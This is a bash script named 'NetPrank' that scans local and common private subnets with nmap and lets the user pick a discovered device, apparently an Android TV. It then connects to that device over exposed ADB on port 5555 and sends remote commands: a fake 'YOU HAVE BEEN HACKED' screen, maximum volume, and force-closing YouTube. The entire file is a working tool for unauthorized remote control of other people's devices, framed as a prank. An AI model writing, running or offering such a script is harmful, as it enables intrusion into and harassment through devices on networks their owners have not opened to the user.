#!/bin/bash

# ========== Banner ==========
clear
figlet "NetPrank"
echo "======================================="
echo " Developer : Ajay Amar Chouhan"
echo " Version   : V 1.2"
echo "======================================="
echo

# Check dependencies
if ! command -v adb &> /dev/null; then
    echo "[!] adb is not installed. Install it first: sudo apt install adb -y"
    exit 1
fi
if ! command -v nmap &> /dev/null; then
    echo "[!] nmap is not installed. Install it first: sudo apt install nmap -y"
    exit 1
fi

# ====== SCAN MODE MENU ======
echo "Choose Scan Mode:"
echo "1) Local Network Scan"
echo "2) Router Network Scan"
echo "3) Other Network (manual subnet input)"
echo "4) Auto Detect (scan multiple networks)"
read -p "Option (1-4): " scan_choice

scan_file="scan.txt"
> $scan_file   # clear old results

if [ "$scan_choice" == "1" ]; then
    SUBNET=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -n 1)
    echo "[*] Local Network Scan: $SUBNET"
    nmap -sn $SUBNET >> $scan_file

elif [ "$scan_choice" == "2" ]; then
    ROUTER_IP=$(ip route | grep default | awk '{print $3}')
    BASE=$(echo $ROUTER_IP | cut -d. -f1-3)
    SUBNET="$BASE.0/24"
    echo "[*] Router Network Scan: $SUBNET"
    nmap -sn $SUBNET >> $scan_file

elif [ "$scan_choice" == "3" ]; then
    read -p "Enter subnet (e.g. 192.168.1.0/24): " SUBNET
    echo "[*] Custom Network Scan: $SUBNET"
    nmap -sn $SUBNET >> $scan_file

elif [ "$scan_choice" == "4" ]; then
    echo "[*] Auto Detect Mode: Scanning multiple networks..."
    # Local subnet
    LOCAL_SUB=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -n 1)
    if [ ! -z "$LOCAL_SUB" ]; then
        echo "[*] Local: $LOCAL_SUB"
        nmap -sn $LOCAL_SUB >> $scan_file
    fi

    # Router subnet
    ROUTER_IP=$(ip route | grep default | awk '{print $3}')
    BASE=$(echo $ROUTER_IP | cut -d. -f1-3)
    ROUTER_SUB="$BASE.0/24"
    echo "[*] Router: $ROUTER_SUB"
    nmap -sn $ROUTER_SUB >> $scan_file

    # Extra common ranges
    echo "[*] Extra: 192.168.0.0/24"
    nmap -sn 192.168.0.0/24 >> $scan_file

    echo "[*] Extra: 10.0.0.0/24"
    nmap -sn 10.0.0.0/24 >> $scan_file
else
    echo "Invalid choice! Exiting..."
    exit 1
fi

# ====== SHOW DEVICES WITH MAC + VENDOR ======
echo
echo "====== Connected Devices ======"
i=1
while read -r line; do
    if [[ $line == *"Nmap scan report for"* ]]; then
        IP=$(echo $line | awk '{print $5}')
        HOST=$(echo $line | awk '{print $6}' | tr -d '()')
    fi
    if [[ $line == *"MAC Address:"* ]]; then
        MAC=$(echo $line | awk '{print $3}')
        VENDOR=$(echo $line | cut -d " " -f 4-)
    fi

    if [ -n "$IP" ]; then
        echo -n "$i) $IP"
        [ -n "$HOST" ] && echo -n "  ($HOST)"
        [ -n "$MAC" ] && echo -n " | MAC: $MAC"
        [ -n "$VENDOR" ] && echo -n " | Vendor: $VENDOR"
        echo

        ips[$i]=$IP
        i=$((i+1))
        IP=""
        HOST=""
        MAC=""
        VENDOR=""
    fi
done < $scan_file

if [ $i -eq 1 ]; then
    echo "[!] No devices found!"
    exit 1
fi

echo "================================"
read -p "Select device (number): " choice
TV_IP=${ips[$choice]}

if [ -z "$TV_IP" ]; then
    echo "Invalid choice! Exiting..."
    exit 1
fi

read -p "Enter port number (default 5555): " TV_PORT
TV_PORT=${TV_PORT:-5555}

echo "[*] Connecting to device: $TV_IP:$TV_PORT"
adb connect $TV_IP:$TV_PORT
adb devices

# ====== PRANK MENU LOOP ======
while true; do
    clear
    figlet "NetPrank"
    echo "======================================="
    echo " Developer : Ajay Amar Chouhan"
    echo " Version   : V 1.2"
    echo "======================================="
    echo
    echo "====== ANDROID TV PRANK MENU ======"
    echo "1) Popup Message (YOU HAVE BEEN HACKED)"
    echo "2) Set Volume to Maximum"
    echo "3) Force Close YouTube"
    echo "4) Disconnect & Exit"
    echo "===================================="
    read -p "Choose an option (1-4): " option

    case $option in
        1)
            echo "[*] Sending popup..."
            adb shell am start -a android.intent.action.WEB_SEARCH --es query "YOU HAVE BEEN HACKED"
            ;;
        2)
            echo "[*] Setting volume to maximum..."
            adb shell media volume --set 15
            ;;
        3)
            echo "[*] Closing YouTube..."
            adb shell am force-stop com.google.android.youtube.tv
            ;;
        4)
            echo "[*] Disconnecting and exiting..."
            adb disconnect $TV_IP:$TV_PORT
            exit 0
            ;;
        *)
            echo "Invalid option! Choose 1-4."
            ;;
    esac
    echo
    read -p "Press Enter to continue..."
done
